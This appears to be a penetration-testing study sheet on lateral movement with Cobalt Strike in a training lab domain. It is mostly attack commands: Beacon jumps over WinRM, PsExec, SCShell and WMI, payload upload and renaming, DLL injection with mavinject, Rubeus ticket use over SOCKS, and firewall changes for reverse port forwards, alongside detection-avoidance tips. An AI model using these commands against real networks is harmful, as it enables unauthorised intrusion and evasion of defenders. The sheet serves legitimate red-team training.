# Lateral Movement (Cobalt Strike)

---

## The Double Hop Problem

After lateral movement via WinRM/PsExec, the new Beacon may fail to authenticate to other domain resources.

**Reason:** Network logon type doesn't cache credentials in LSASS on the remote target. Both WinRM and PsExec use Network logon type.

```
# After WinRM lateral movement
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
powerpick Get-DomainTrust

ERROR: Exception calling "FindOne" with "0" argument(s): "An operations error occurred."
```

After moving laterally, you only have the service ticket that allowed the connection:
```
Cached Tickets: (1)

#0>	Client: tmorgan @ INLANEFREIGHT.LOCAL
	Server: HTTP/ilf-ws-1 @ INLANEFREIGHT.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
```

**Solution:** Use impersonation technique (`make_token` or `ptt`) to populate the session with credentials.

Or, run enumeration from the original session that already has credential material.

---

## WinRM

Beacon runs in context of current/impersonated user.

```
# Jump to new Beacon
jump winrm64 ilf-ws-1 smb

# Single command execution
remote-exec winrm ilf-ws-1 net sessions
```

---

## PsExec

Beacon runs as **SYSTEM**.

> ⚠️ **LOUD** - Service creation is relatively rare and easily detected.

```
jump psexec64 ilf-ws-1 smb
```

---

## SCShell (Quieter PsExec)

Modifies an existing service temporarily instead of creating a new one.

**Setup:** Load `C:\Tools\SCShell\CS-BOF\scshell.cna` via **Cobalt Strike > Script Manager**

```
jump scshell64 ilf-ws-1 smb
```

---

## WMI

Upload payload and execute via WMI.

```
# Change to writable share
cd \\ilf-ws-1\ADMIN$

# Upload payload
upload C:\Payloads\smb_x64.exe

# Optionally rename
mv \\ilf-ws-1\ADMIN$\smb_x64.exe \\ilf-ws-1\ADMIN$\hidden.exe

# Execute via WMI
remote-exec wmi ilf-ws-1 C:\Windows\hidden.exe

# Link to new Beacon
link ilf-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

---

## MavInject (OPSEC Warning)

> ⚠️ **BAD OPSEC** - Avoid if possible.

Injects DLL into remote process using signed Microsoft executable.

```
# List remote processes
remote-exec winrm ilf-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id

# Upload DLL to target
cd \\ilf-ws-1\ADMIN$\System32
upload C:\Payloads\smb_x64.dll

# Inject into target process
remote-exec wmi ilf-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll

# Link to new Beacon
link ilf-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

---

## SOCKS Proxy

### Start SOCKS Proxy

```
socks 1080
```

### Add Targets to Hosts File

Required for Kerberos (needs hostnames):

```powershell
# Local ops station
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 ilf-dc-1'
```

### Proxifier (Windows)

1. **Profile > Proxy Servers** - Add team server IP and SOCKS port
2. **Profile > Proxification Rules** - Target internal IP range only
3. Run tools through proxy (e.g., AD Explorer: `C:\Tools\SysinternalsSuite\ADExplorer64.exe`)

### AD Enumeration via SOCKS

```powershell
# Local ops station
$Cred = Get-Credential INLANEFREIGHT.LOCAL\tmorgan
Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server ilf-dc-1
```

### Kerberos Authentication via SOCKS

Create process with injected ticket:
```
# Local ops station
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /domain:INLANEFREIGHT.LOCAL /username:tmorgan /password:FakePass /program:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /ticket:C:\Users\Attacker\Desktop\tmorgan.kirbi /show
```

Request service tickets manually:
```
# Local ops station
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/ilf-dc-1 /ticket:C:\Users\Attacker\Desktop\tmorgan.kirbi /dc:ilf-dc-1 /ptt

Import-Module ActiveDirectory
Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Server ilf-dc-1 | select DistinguishedName
```

---

## Reverse Port Forwards

Forward traffic from compromised host back to team server.

```
rportfwd [bind port] [forward host] [forward port]
```

### Example: Forward HTTP to Team Server

```
# Add firewall rule
make_token INLANEFREIGHT\tmorgan Passw0rd!
run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190

# Start reverse port forward
rportfwd 28190 localhost 80

# Test from another host
remote-exec winrm ilf-ws-1 iwr http://ilf-wkstn-1:28190/test
```

Check **View > Web Log** for incoming requests.

### Cleanup

```
rportfwd stop 28190
run netsh advfirewall firewall delete rule name="Debug"
```

---

## Quick Reference

| Technique | Runs As | OPSEC | Use Case |
|-----------|---------|-------|----------|
| `jump winrm64` | Current user | Medium | General lateral movement |
| `jump psexec64` | SYSTEM | Loud | Need SYSTEM access |
| `jump scshell64` | SYSTEM | Quieter | Avoid service creation |
| `remote-exec wmi` | Current user | Medium | Custom payload execution |
| MavInject | Target process | Bad | Last resort DLL injection |
